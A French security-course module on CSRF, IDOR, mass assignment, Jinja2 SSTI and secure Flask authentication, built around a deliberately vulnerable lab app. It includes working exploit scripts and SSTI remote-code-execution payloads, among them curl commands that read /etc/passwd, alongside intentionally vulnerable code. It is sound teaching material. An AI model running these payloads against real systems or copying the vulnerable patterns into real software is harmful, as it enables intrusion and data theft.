# Security By Design: SÉANCE 2 : Autorisations, authentification et Security by Design (3h30)

---

## Module 2.1 - Cross-Site Request Forgery / CSRF (30 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Expliquer pourquoi le navigateur envoie automatiquement les cookies et en quoi cela rend CSRF possible
> - Créer une page malveillante démontrant une attaque CSRF sur une application vulnérable
> - Protéger une application Flask avec Flask-WTF (tokens CSRF) et l'attribut `SameSite` des cookies
> - Distinguer les quatre méthodes de protection CSRF et choisir la plus adaptée selon le contexte (formulaires HTML vs API JSON)

### 2.1.1 Principe d'attaque

**Pourquoi CSRF est-il possible ?**

Les navigateurs appliquent une règle fondamentale : pour toute requête vers un domaine, ils joignent automatiquement les cookies associés à ce domaine, **quelle que soit l'origine de la page qui a déclenché la requête**. Cette règle, conçue pour la navigation normale entre sites, devient une faille dès qu'une page malveillante l'exploite pour déclencher des actions à l'insu d'un utilisateur authentifié.

L'attaquant n'a jamais besoin de connaître ni de voler le cookie de session : c'est le **navigateur de la victime** qui le fournit automatiquement. La seule condition est que la victime soit connectée au site cible et qu'elle visite une page malveillante dans la même session.

CSRF exploite la confiance d'un site envers un utilisateur authentifié. Le navigateur envoie automatiquement les cookies de session, même pour des requêtes initiées depuis un autre site.

**Scénario type** : le navigateur envoie automatiquement les cookies de session pour le domaine de destination, même si la requête est initiée depuis un site tiers. L'attaquant n'a pas besoin de connaître le cookie, c'est le navigateur qui le fournit.

```mermaid
sequenceDiagram
    participant A as Alice (navigateur)
    participant B as Blog piégé (attaquant)
    participant V as VulnPyApp
    A->>V: Connexion
    V-->>A: Cookie de session
    A->>B: Visite blog-piege.com
    B-->>A: Page avec formulaire caché<br/>action: POST /profile/update
    Note over A: JS soumet le formulaire automatiquement
    A->>V: POST /profile/update<br/>(avec cookie session)
    Note over A,V: Cookie envoyé automatiquement<br/>car destination = vulnpyapp.local
    V->>V: Pas de vérification CSRF<br/>requête traitée comme légitime
    V-->>A: Profil modifié sans consentement
```

### 2.1.2 Exploitation

**Création d'une page malveillante** :

```python
# attacker_server.py - serveur d'attaque pour PoC
from flask import Flask, request

attacker_app = Flask(__name__)

@attacker_app.route('/')
def malicious_page():
    return """
    <!DOCTYPE html>
    <html>
    <head><title>Vous avez gagné !</title></head>
    <body>
        <h1>🎁 Félicitations ! Cliquez pour réclamer</h1>

        <!-- Attaque CSRF cachée : modification du profil de la victime -->
        <form id="csrf-attack"
              action="http://localhost:5000/profile/update"
              method="POST"
              style="display:none">
            <input name="username" value="pwned-by-csrf">
            <input name="bio" value="This account was hijacked via CSRF.">
        </form>

        <script>
            // Soumission automatique au chargement
            document.getElementById('csrf-attack').submit();
        </script>
    </body>
    </html>
    """

@attacker_app.route('/log', methods=['POST', 'GET'])
def log_stolen_data():
    print(f"📥 Données reçues : {request.values.to_dict()}")
    return '', 204

if __name__ == '__main__':
    attacker_app.run(port=8000)
```

**Script Python d'exploitation automatisée** :

```python
# scripts/csrf_demo.py
import requests

# Simulation : Alice est connectée
session = requests.Session()
session.post('http://localhost:5000/login', data={
    'email': 'alice@vulnpyapp.local',
    'password': 'Alice123!'
})

# L'attaquant fait une requête depuis "l'extérieur" avec la session d'Alice
# (simulant une requête déclenchée par une page malveillante)
response = session.post(
    'http://localhost:5000/profile/update',
    data={
        'username': 'pwned-by-csrf',
        'bio': 'This account was hijacked via CSRF.'
    },
    headers={
        # Pas de header Origin/Referer ou un mauvais
        'Origin': 'http://attacker.com'
    }
)

if response.status_code == 200:
    print("🚨 ATTAQUE CSRF RÉUSSIE - L'application est vulnérable")
else:
    print(f"✅ Protection active (status: {response.status_code})")
```

### 2.1.3 Protections en Python/Flask

**Méthode 1 : Tokens CSRF avec Flask-WTF**

```python
# ✅ SÉCURISÉ - Flask-WTF
from flask import Flask
from flask_wtf.csrf import CSRFProtect
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField
from wtforms.validators import DataRequired, Length

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-very-long-random-secret'
csrf = CSRFProtect(app)

class PasswordChangeForm(FlaskForm):
    new_password = PasswordField('Nouveau mot de passe',
                                  validators=[DataRequired(), Length(min=12)])
    confirm_password = PasswordField('Confirmation',
                                      validators=[DataRequired()])

@app.route('/account/change-password', methods=['GET', 'POST'])
def change_password():
    form = PasswordChangeForm()
    if form.validate_on_submit():  # Vérifie le CSRF token
        # Logique de changement
        return redirect('/account')
    return render_template('change_password.html', form=form)
```

```html
<!-- templates/change_password.html -->
<form method="POST">
    {{ form.csrf_token }}  <!-- Token CSRF automatique -->
    {{ form.new_password.label }} {{ form.new_password }}
    {{ form.confirm_password.label }} {{ form.confirm_password }}
    <button type="submit">Changer</button>
</form>
```

**Méthode 2 : CSRF pour API JSON (header)**

```python
# ✅ SÉCURISÉ - CSRF pour API
from functools import wraps
import secrets
from flask import session, request, jsonify

def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)
    return session['csrf_token']

def csrf_protect(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            token = request.headers.get('X-CSRF-Token')
            if not token or token != session.get('csrf_token'):
                return jsonify({'error': 'CSRF token invalide'}), 403
        return f(*args, **kwargs)
    return decorated

@app.route('/api/csrf-token')
def get_csrf_token():
    return jsonify({'csrf_token': generate_csrf_token()})

@app.route('/api/account', methods=['PUT'])
@csrf_protect
def update_account():
    # Logique sécurisée
    pass
```

**Méthode 3 : SameSite Cookies (défense en profondeur)**

```python
# ✅ Configuration cookies avec SameSite
app.config.update(
    SESSION_COOKIE_SECURE=True,        # HTTPS uniquement
    SESSION_COOKIE_HTTPONLY=True,      # Pas accessible via JS
    SESSION_COOKIE_SAMESITE='Strict',  # Bloque les requêtes cross-site
)
```

**Détail des modes SameSite** :

| Mode | Comportement | Protection CSRF |
|------|-------------|-----------------|
| `Strict` | Cookie jamais envoyé en cross-site | Maximale, mais peut casser les liens entrants |
| `Lax` (défaut) | Cookie envoyé pour les navigations GET top-level | Bon équilibre par défaut |
| `None` | Cookie envoyé pour toutes les requêtes | Aucune (nécessite `Secure` + HTTPS) |

**Méthode 4 : Vérification d'origine**

```python
# ✅ Vérification Origin/Referer
ALLOWED_ORIGINS = ['https://app.com', 'https://www.app.com']

@app.before_request
def check_csrf_origin():
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        origin = request.headers.get('Origin') or request.headers.get('Referer', '').rstrip('/')
        if not any(origin.startswith(o) for o in ALLOWED_ORIGINS):
            abort(403, description="Origin non autorisée")
```

> **À retenir**
> - CSRF exploite la confiance implicite du serveur envers le navigateur : les cookies de session sont envoyés automatiquement, l'attaquant n'en a jamais besoin directement.
> - `SameSite=Strict` sur le cookie de session est la défense la plus simple et robuste — dans la majorité des cas modernes, elle seule suffit.
> - Le token CSRF doit être **lié à la session** et à **usage unique par formulaire** pour une protection maximale.
> - Les requêtes `GET` ne doivent **jamais** produire d'effet de bord (écriture, suppression, modification) : CSRF devient alors inapplicable sur ces routes.

---

## Module 2.2 - Insecure Direct Object Reference / IDOR (30 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Distinguer authentification et autorisation et expliquer pourquoi les deux contrôles sont indépendants
> - Identifier une faille IDOR dans du code Python et décrire son impact concret
> - Écrire du code Flask qui filtre les objets par propriétaire avant de les retourner
> - Comparer les modèles RBAC, ABAC et ACL pour choisir le plus adapté à un contexte

### 2.2.0 Authentification vs Autorisation

**Distinction fondamentale** :
- **Authentification (AuthN)** : vérifier l'identité — *qui êtes-vous ?* (login, MFA, certificat…)
- **Autorisation (AuthZ)** : vérifier les droits — *que pouvez-vous faire ?* (rôles, attributs, listes de droits…)

Ces deux contrôles sont **indépendants et complémentaires** : un utilisateur peut être authentifié sans être autorisé à accéder à une ressource spécifique. La vérification d'autorisation doit toujours se faire **côté serveur**, jamais uniquement côté client.

**Modèles de contrôle d'accès** :
- **RBAC** (Role-Based Access Control) : droits assignés par rôles prédéfinis (admin, user, manager)
- **ABAC** (Attribute-Based Access Control) : décisions basées sur des attributs contextuels (service, pays, statut du compte, heure)
- **ACL** (Access Control List) : listes explicites de droits par ressource (ex. partage de fichiers, règles de pare-feu)

### 2.2.1 Principe

IDOR se produit quand l'application expose une référence directe à un objet (ID en URL, paramètre) sans vérifier que l'utilisateur a le droit d'y accéder.

### 2.2.2 Exemples vulnérables

```python
# 🚨 VULNÉRABLE - Pas de vérification de propriété
@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)
    if not order:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(order.to_dict())
# Un utilisateur peut accéder à n'importe quelle commande !

# 🚨 VULNÉRABLE - Modification sans vérification
@app.route('/api/users/<int:user_id>', methods=['PUT'])
@login_required
def update_user(user_id):
    user = User.query.get(user_id)
    user.email = request.json.get('email')
    db.session.commit()
    return jsonify(user.to_dict())
# Un utilisateur peut modifier le compte d'un autre !
```

**Comparaison accès vulnérable vs sécurisé** : dans le cas vulnérable, la fonction ne vérifie pas le propriétaire de l'objet. Dans le cas sécurisé, la requête filtre par utilisateur courant.

```mermaid
graph TD
    subgraph Vulnérable["🚨 Accès VULNÉRABLE"]
        V1["GET /api/orders/5"] --> V2["Order.query.get(5)"]
        V2 --> V3["Retourne la commande<br/>sans vérifier le propriétaire"]
    end
    
    space1[" "]
    
    subgraph Sécurisé["✅ Accès SÉCURISÉ"]
        S1["GET /api/orders/5"] --> S2["Order.query.filter_by<br/>id=5, user_id=current_user.id"]
        S2 --> S3{"user_id correspond?"}
        S3 -->|Oui| S4["Retourne la commande"]
        S3 -->|Non| S5["403 Accès interdit"]
    end
    
    Vulnérable --> space1
    space1 --> Sécurisé
    
    style space1 fill:none,stroke:none
```

### 2.2.3 Exploitation

```python
# scripts/exploit_idor.py
import requests

# Connexion en tant qu'utilisateur normal (Bob)
session = requests.Session()
session.post('http://localhost:5000/login', data={
    'email': 'bob@vulnpyapp.local',
    'password': 'Bobby123!'
})

print("🔍 Test IDOR sur /api/orders/<id>")
for order_id in range(1, 20):
    r = session.get(f'http://localhost:5000/api/orders/{order_id}')
    if r.status_code == 200:
        data = r.json()
        # Bob accède à des commandes qui ne sont pas les siennes
        if data.get('user_id') != 3:  # Bob = id 3
            print(f"🚨 IDOR : commande {order_id} appartient à user {data['user_id']}")
            print(f"   Données : {data}")

print("\n🔍 Test info-disclosure sur /api/users/<id>")
# L'endpoint GET expose is_admin et email d'autres utilisateurs (vraie vuln)
r = session.get('http://localhost:5000/api/users/1')  # id 1 = admin
if r.status_code == 200:
    data = r.json()
    print(f"🚨 Fuite : compte admin exposé → {data}")
    # → {'id': 1, 'email': 'admin@vulnpyapp.local', 'is_admin': True, ...}
```

### 2.2.4 Protection : vérification d'autorisation

**Méthode 1 : Vérification explicite de propriété**

```python
# ✅ SÉCURISÉ - Vérification de propriété
from flask_login import current_user, login_required

@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get_or_404(order_id)

    # Vérifier que l'utilisateur est propriétaire ou admin
    if order.user_id != current_user.id and not current_user.is_admin:
        abort(403, description="Accès interdit")

    return jsonify(order.to_dict())
```

**Méthode 2 : Filtrage par utilisateur (recommandé)**

```python
# ✅ SÉCURISÉ - Filtrage à la source
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    # La requête elle-même filtre par utilisateur
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id
    ).first_or_404()
    return jsonify(order.to_dict())

# Encore mieux : ne pas exposer les IDs du tout
@app.route('/api/my/orders')
@login_required
def my_orders():
    orders = Order.query.filter_by(user_id=current_user.id).all()
    return jsonify([o.to_dict() for o in orders])
```

**Méthode 3 : Décorateur d'autorisation**

```python
# ✅ SÉCURISÉ - Décorateur réutilisable
from functools import wraps

def require_ownership(model, id_param='id', owner_field='user_id'):
    def decorator(f):
        @wraps(f)
        @login_required
        def decorated(*args, **kwargs):
            obj_id = kwargs.get(id_param)
            obj = model.query.get_or_404(obj_id)

            if getattr(obj, owner_field) != current_user.id and not current_user.is_admin:
                abort(403)

            kwargs['obj'] = obj
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/api/orders/<int:id>')
@require_ownership(Order)
def get_order(id, obj):
    return jsonify(obj.to_dict())
```

**Méthode 4 : Identifiants non prédictibles (UUID)**

```python
# ✅ SÉCURISÉ - UUID au lieu d'IDs séquentiels
import uuid
from sqlalchemy.dialects.postgresql import UUID

class Order(db.Model):
    id = db.Column(db.Integer, primary_key=True)  # Interne uniquement
    public_id = db.Column(db.String(36), unique=True,
                          default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))

# Exposer uniquement le public_id
@app.route('/api/orders/<string:public_id>')
@login_required
def get_order(public_id):
    order = Order.query.filter_by(
        public_id=public_id,
        user_id=current_user.id
    ).first_or_404()
    return jsonify(order.to_dict())
```

> **À retenir**
> - L'**authentification** prouve l'identité ; l'**autorisation** vérifie les droits — un utilisateur peut être authentifié sans être autorisé sur une ressource spécifique.
> - La règle d'or IDOR : filtrer **toujours** par `user_id=current_user.id` dans la requête elle-même plutôt que de vérifier après récupération.
> - Les UUIDs ne remplacent pas le contrôle d'accès : ils rendent l'énumération plus difficile, mais un UUID divulgué reste exploitable sans vérification de propriété.
> - Toute vérification d'autorisation côté client uniquement (JavaScript, état UI) est contournable : la vérification **doit** se faire côté serveur.

---

## Module 2.3 - Mass Assignment (15 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Identifier une vulnérabilité de mass assignment et la corriger avec une allowlist ou un schéma Pydantic avec `extra = 'forbid'`

### 2.3.1 Mass Assignment

**Principe** : l'application accepte aveuglément tous les champs envoyés par l'utilisateur. Si le modèle User a un champ sensible comme `is_admin`, l'attaquant peut injecter sa valeur dans la requête POST pour s'élever en privilèges.

```mermaid
graph LR
    subgraph Attaque
        A1[Inscription] --> A2["Champs normaux : email, password, name"]
        A2 --> A3["Champ injecté : is_admin=true"]
        A3 --> A4["User(**data) crée un compte admin"]
    end
    subgraph Protection
        B1[Inscription] --> B2["Schéma explicite<br/>extra = forbid"]
        B2 --> B3["Champ inconnu rejeté<br/>400 Bad Request"]
    end
```

```python
# 🚨 VULNÉRABLE - extrait de VulnPyApp app.py
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        # 🚨 VULNÉRABLE : tous les champs du formulaire passent au modèle
        data = request.form.to_dict()
        user = User(**{k: v for k, v in data.items() if k != 'password'})
        user.set_password(data.get('password', ''))
        db.session.add(user)
        db.session.commit()
        login_user(user)
        return redirect(url_for('profile'))
```

**Exploitation** :

```python
# scripts/exploit_mass_assignment.py
import requests

# Création d'un compte avec is_admin=true injecté dans le formulaire
r = requests.post('http://localhost:5000/register', data={
    'email': 'evil@attacker.com',
    'username': 'evil',
    'password': 'Evil123!',
    'bio': 'Pwned',
    'is_admin': 'true',  # 🎯 Champ non prévu mais accepté par User(**data)
})

# Vérification : connexion et accès au panel admin
s = requests.Session()
s.post('http://localhost:5000/login', data={
    'email': 'evil@attacker.com',
    'password': 'Evil123!'
})
admin_page = s.get('http://localhost:5000/admin')

if admin_page.status_code == 200:
    print("🚨 Élévation de privilèges réussie via mass assignment !")
```

**Protections** :

```python
# ✅ SÉCURISÉ - Whitelist explicite
ALLOWED_FIELDS = {'email', 'name', 'phone', 'avatar'}

@app.route('/api/users/<int:user_id>', methods=['PUT'])
@login_required
def update_user(user_id):
    if user_id != current_user.id:
        abort(403)

    user = User.query.get_or_404(user_id)
    data = request.get_json()

    # Filtrer aux champs autorisés uniquement
    for key in ALLOWED_FIELDS & data.keys():
        setattr(user, key, data[key])

    db.session.commit()
    return jsonify(user.to_dict())

# ✅ MEILLEUR - Validation avec Pydantic
from pydantic import BaseModel, EmailStr, constr, ValidationError

class UserUpdateSchema(BaseModel):
    email: EmailStr | None = None
    name: constr(max_length=100) | None = None
    phone: constr(pattern=r'^\+?[0-9]{10,15}$') | None = None

    class Config:
        extra = 'forbid'  # Rejette les champs inconnus

@app.route('/api/users/<int:user_id>', methods=['PUT'])
@login_required
def update_user(user_id):
    if user_id != current_user.id:
        abort(403)

    try:
        data = UserUpdateSchema(**request.get_json())
    except ValidationError as e:
        return jsonify({'errors': e.errors()}), 400

    user = User.query.get_or_404(user_id)
    for field, value in data.dict(exclude_unset=True).items():
        setattr(user, field, value)

    db.session.commit()
    return jsonify(user.to_dict())
```

> **À retenir**
> - **Mass assignment** : ne jamais passer `request.form.to_dict()` directement à un constructeur de modèle — toujours utiliser une allowlist ou un schéma avec `extra = 'forbid'`.

---

## Module 2.4 - Server-Side Template Injection (SSTI) (20 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Reconnaître un point d'injection SSTI dans un template Jinja2
> - Exploiter une SSTI pour atteindre le RCE complet
> - Implémenter la protection : templates statiques et variables passées en arguments

### 2.4.1 Principe de la vulnérabilité

**Injection dans un template côté serveur** : si une variable utilisateur est insérée directement dans un template (via concaténation de chaîne), l'attaquant peut injecter du code Jinja2 qui sera exécuté sur le serveur.

```python
# 🚨 VULNÉRABLE - Concaténation dans render_template_string()
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}</h1>"  # ← Concaténation = template variable
    return render_template_string(template)

# Attaque : /hello?name={{7*7}}
# → Affiche "<h1>Hello 49</h1>" car {{ 7*7 }} est évalué par Jinja2
```

**Différence SSTI ↔ XSS** :
- XSS : exécution de JavaScript dans le navigateur
- SSTI : exécution de code Python/Jinja2 sur le serveur ← **plus grave**

### 2.4.2 Exploitation — Du RCE complet

**Détection** :
```
http://localhost:5000/hello?name={{7*7}}
→ Réponse : "Hello 49" → SSTI confirmée ✅
```

**Escalade vers le RCE** :

```python
payloads = [
    # Fuite de configuration Flask
    "{{ config }}",
    
    # Accès aux variables globales de Python
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    
    # Exécution de commandes système via os.popen()
    "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    
    # Accès aux __builtins__ pour importer des modules
    "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
    
    # Variante courte (souvent plus simple)
    "{{ self.__init__.__globals__.__builtins__.__import__('os').system('touch /tmp/pwned') }}",
]
```

**Démo d'exploitation** :
```bash
# Créer un fichier sur le serveur
curl "http://localhost:5000/hello?name={{ self.__init__.__globals__.__builtins__.__import__('os').system('touch /tmp/pwned') }}"

# Afficher le contenu d'un fichier
curl "http://localhost:5000/hello?name={{ ''.__class__.__mro__[1].__subclasses__()[434].__init__.__globals__['popen']('cat /etc/passwd').read() }}"
```

### 2.4.3 Protection — Trois règles essentielles

**Règle 1 : Templates statiques — jamais de concaténation**

```python
# ❌ DANGEREUX
template = f"<h1>Hello {user_input}</h1>"
return render_template_string(template)

# ✅ SÛR
return render_template_string("<h1>Hello {{ name }}</h1>", name=user_input)
```

**Règle 2 : Jinja2 auto-escape par défaut**

```python
# ✅ Par défaut, Jinja2 échappe les variables HTML
# {{ "<script>" }} → &lt;script&gt;
# Mais SSTI passe la validation : {{ ''.__class__ }} s'exécute toujours
```

**Règle 3 : Utiliser des fichiers de template, pas render_template_string()**

```python
# ✅ MEILLEUR
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    return render_template('hello.html', name=name)

# Fichier : templates/hello.html
# <h1>Hello {{ name }}</h1>
```

**Défense en profondeur** :

1. **Désactiver les builtin dangereux** (si possible)
```jinja2
{% set allowed_vars = {'config': false, '__class__': false} %}
```

2. **Filtrer avec un schéma** (Pydantic, Marshmallow)
```python
from pydantic import BaseModel, constr

class HelloSchema(BaseModel):
    name: constr(max_length=100, regex=r'^[a-zA-Z0-9 ]+$')  # Alphanumériques uniquement

try:
    data = HelloSchema(name=request.args.get('name'))
except ValidationError:
    return "Invalid name", 400
```

3. **Utiliser une sandbox** (très restrictive)
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("{{ user_input }}")  # Exécution sécurisée
```

> **À retenir**
> - **SSTI** = `render_template_string(f"...{user_input}...")` = **RCE complet**
> - Les templates doivent être statiques ; **jamais de concaténation** avec une variable utilisateur
> - Jinja2 auto-escape protège contre XSS dans les templates, **pas contre SSTI**
> - CWE-1336 (SSTI), OWASP A03 (Injection)

---

## Module 2.5 - Authentification sécurisée (45 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Classer les algorithmes de hashage de mots de passe du moins au plus sécurisé et justifier le choix d'Argon2
> - Implémenter une authentification complète en Python : hash, vérification, lockout progressif, rehash transparent
> - Concevoir un flux de réinitialisation de mot de passe sécurisé (token à usage unique, haché, expirant)
> - Configurer TOTP avec pyotp pour une authentification à deux facteurs
> - Appliquer les recommandations NIST SP 800-63B sur la politique de mots de passe

### 2.4.1 Stockage des mots de passe

**Pourquoi les mots de passe doivent-ils être hashés, et pourquoi tous les hashs ne se valent pas ?**

Un mot de passe ne doit jamais être stocké en clair : si la base de données est compromise (dump SQL, accès physique, backup mal protégé), les mots de passe doivent rester inutilisables par l'attaquant. Le hashage transforme un mot de passe en empreinte non réversible.

Cependant, tous les algorithmes de hashage ne se valent pas pour cet usage :
- Les hash **rapides** (MD5, SHA-256) permettent de tester des milliards de mots de passe par seconde sur GPU, rendant le brute force trivial même sur des hashs salés.
- Les algorithmes dédiés (bcrypt, Argon2) sont **intentionnellement lents** et consomment de la mémoire, rendant les attaques massives prohibitives même avec du matériel spécialisé.

Le choix de l'algorithme est une décision architecturale : utiliser MD5 ou SHA-256 pour stocker des mots de passe est une **faute de conception**, pas un compromis de performance acceptable.

**Hiérarchie de mauvaises à bonnes pratiques** :

```python
import hashlib

# 🔥 CATASTROPHE - Stockage en clair
db.save({'password': password})

# 🚨 MAUVAIS - Hash rapide sans sel
hashed = hashlib.md5(password.encode()).hexdigest()  # MD5 est cassé
hashed = hashlib.sha256(password.encode()).hexdigest()  # Trop rapide → bruteforce GPU

# ⚠️ INSUFFISANT - Hash avec sel mais non itéré
salt = os.urandom(16)
hashed = hashlib.sha256(salt + password.encode()).hexdigest()

# ✅ BON - bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# ✅ EXCELLENT - Argon2 (recommandé OWASP)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)
```

**Évolution des techniques** : chaque étape ajoute une couche de protection. Le sel empêche les rainbow tables, l'itération ralentit le bruteforce, Argon2 résiste aux attaques GPU/ASIC.

```mermaid
graph BT
    C1[Stockage en clair] --> C2[MD5 sans sel]
    C2 --> C3[SHA-256 sans sel]
    C3 --> C4[SHA-256 + sel]
    C4 --> C5["bcrypt rounds=12"]
    C5 --> C6[Argon2id]
    C1 -. 0 seconde .-> T[Temps pour casser un mot de passe]
    C2 -. secondes .-> T
    C3 -. minutes .-> T
    C4 -. heures .-> T
    C5 -. jours .-> T
    C6 -. années .-> T
```

### 2.4.2 Implémentation complète

```python
# auth.py - Module d'authentification sécurisé
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
import secrets
import re
from datetime import datetime, timedelta

ph = PasswordHasher(
    time_cost=3,        # Itérations
    memory_cost=65536,  # 64 MB
    parallelism=4
)

class PasswordPolicy:
    """Politique de mots de passe forte (OWASP)"""
    MIN_LENGTH = 12
    MAX_LENGTH = 128
    MIN_UPPERCASE = 1
    MIN_LOWERCASE = 1
    MIN_DIGITS = 1
    MIN_SPECIAL = 1

    # Top 10000 mots de passe les plus utilisés (à charger)
    COMMON_PASSWORDS = set()

    @classmethod
    def validate(cls, password: str) -> tuple[bool, list[str]]:
        errors = []

        if len(password) < cls.MIN_LENGTH:
            errors.append(f"Au moins {cls.MIN_LENGTH} caractères requis")
        if len(password) > cls.MAX_LENGTH:
            errors.append(f"Maximum {cls.MAX_LENGTH} caractères")
        if sum(c.isupper() for c in password) < cls.MIN_UPPERCASE:
            errors.append("Au moins une majuscule requise")
        if sum(c.islower() for c in password) < cls.MIN_LOWERCASE:
            errors.append("Au moins une minuscule requise")
        if sum(c.isdigit() for c in password) < cls.MIN_DIGITS:
            errors.append("Au moins un chiffre requis")
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Au moins un caractère spécial requis")
        if password.lower() in cls.COMMON_PASSWORDS:
            errors.append("Ce mot de passe est trop courant")

        return len(errors) == 0, errors


class AuthService:
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash un mot de passe avec Argon2"""
        return ph.hash(password)

    @staticmethod
    def verify_password(password: str, hashed: str) -> bool:
        """Vérifie un mot de passe en temps constant"""
        try:
            ph.verify(hashed, password)
            return True
        except VerifyMismatchError:
            return False

    @staticmethod
    def needs_rehash(hashed: str) -> bool:
        """Détermine si le hash doit être recalculé (paramètres obsolètes)"""
        return ph.check_needs_rehash(hashed)


def register(email: str, password: str):
    # Validation politique
    valid, errors = PasswordPolicy.validate(password)
    if not valid:
        raise ValueError(f"Mot de passe invalide : {', '.join(errors)}")

    # Vérification HaveIBeenPwned (optionnel)
    if is_password_pwned(password):
        raise ValueError("Ce mot de passe a été compromis dans une fuite connue")

    # Hash et stockage
    user = User(
        email=email.lower().strip(),
        password_hash=AuthService.hash_password(password),
        created_at=datetime.utcnow()
    )
    db.session.add(user)
    db.session.commit()
    return user


def login(email: str, password: str):
    user = User.query.filter_by(email=email.lower().strip()).first()

    if not user:
        # IMPORTANT : effectuer un hash factice pour éviter l'énumération via timing
        AuthService.hash_password("dummy_password_to_match_timing")
        raise AuthenticationError("Identifiants invalides")

    if user.locked_until and user.locked_until > datetime.utcnow():
        raise AuthenticationError("Compte verrouillé temporairement")

    if not AuthService.verify_password(password, user.password_hash):
        user.failed_attempts += 1
        if user.failed_attempts >= 5:
            user.locked_until = datetime.utcnow() + timedelta(minutes=15)
        db.session.commit()
        raise AuthenticationError("Identifiants invalides")

    # Reset compteur + rehash si nécessaire
    user.failed_attempts = 0
    user.last_login = datetime.utcnow()
    if AuthService.needs_rehash(user.password_hash):
        user.password_hash = AuthService.hash_password(password)
    db.session.commit()

    return user


def is_password_pwned(password: str) -> bool:
    """Vérification via API HaveIBeenPwned (k-anonymity)"""
    import requests
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]

    response = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}',
                            timeout=2)
    if response.status_code == 200:
        return suffix in response.text
    return False
```

**Recommandations NIST SP 800-63B sur la politique de mots de passe** :
- Privilégier les **passphrases** longues et mémorisables plutôt que des règles de complexité arbitraires (combinaison imposée majuscule + chiffre + symbole).
- **Ne pas imposer de rotation périodique forcée** : les changements fréquents favorisent les mots de passe faibles et prévisibles. Ne forcer le renouvellement qu'en cas de suspicion de compromission.
- Bloquer les mots de passe présents dans des listes de fuites connues (HaveIBeenPwned, rockyou.txt).

### 2.4.3 Réinitialisation de mot de passe sécurisée

```python
# password_reset.py
import secrets
from datetime import datetime, timedelta

class PasswordResetToken(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    token_hash = db.Column(db.String(64), unique=True)
    expires_at = db.Column(db.DateTime)
    used_at = db.Column(db.DateTime, nullable=True)

@app.route('/forgot-password', methods=['POST'])
@rate_limit('5 per hour')
def forgot_password():
    email = request.form.get('email', '').lower().strip()
    user = User.query.filter_by(email=email).first()

    # Toujours répondre OK pour ne pas révéler l'existence d'un compte
    response_message = "Si un compte existe, un email a été envoyé"

    if user:
        # Générer token cryptographiquement sûr
        token = secrets.token_urlsafe(32)
        token_hash = hashlib.sha256(token.encode()).hexdigest()

        # Stocker le HASH du token (pas le token en clair)
        reset = PasswordResetToken(
            user_id=user.id,
            token_hash=token_hash,
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )
        db.session.add(reset)
        db.session.commit()

        # Envoyer email (le token n'est jamais stocké en clair en BDD)
        send_reset_email(user.email, token)

    return jsonify({'message': response_message})


@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.form.get('token')
    new_password = request.form.get('new_password')

    token_hash = hashlib.sha256(token.encode()).hexdigest()
    reset = PasswordResetToken.query.filter_by(token_hash=token_hash).first()

    if not reset or reset.expires_at < datetime.utcnow() or reset.used_at:
        abort(400, description="Token invalide ou expiré")

    # Validation politique
    valid, errors = PasswordPolicy.validate(new_password)
    if not valid:
        return jsonify({'errors': errors}), 400

    # Réinitialiser
    user = User.query.get(reset.user_id)
    user.password_hash = AuthService.hash_password(new_password)
    reset.used_at = datetime.utcnow()  # Token à usage unique

    # Invalider toutes les autres sessions
    invalidate_user_sessions(user.id)

    db.session.commit()

    # Notification de sécurité
    send_security_notification(user.email, "Mot de passe modifié")

    return jsonify({'message': 'Mot de passe réinitialisé'})
```

### 2.4.4 Multi-Factor Authentication (TOTP)

```python
# mfa.py - Implémentation TOTP
import pyotp
import qrcode
import io
import base64

class MFAService:
    @staticmethod
    def generate_secret() -> str:
        """Génère un secret TOTP base32"""
        return pyotp.random_base32()

    @staticmethod
    def generate_qr_code(user_email: str, secret: str) -> str:
        """Génère un QR code pour Google Authenticator"""
        uri = pyotp.totp.TOTP(secret).provisioning_uri(
            name=user_email,
            issuer_name='VulnPyApp'
        )
        img = qrcode.make(uri)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        return base64.b64encode(buffer.getvalue()).decode()

    @staticmethod
    def verify_token(secret: str, token: str) -> bool:
        """Vérifie un code TOTP avec fenêtre de tolérance"""
        totp = pyotp.TOTP(secret)
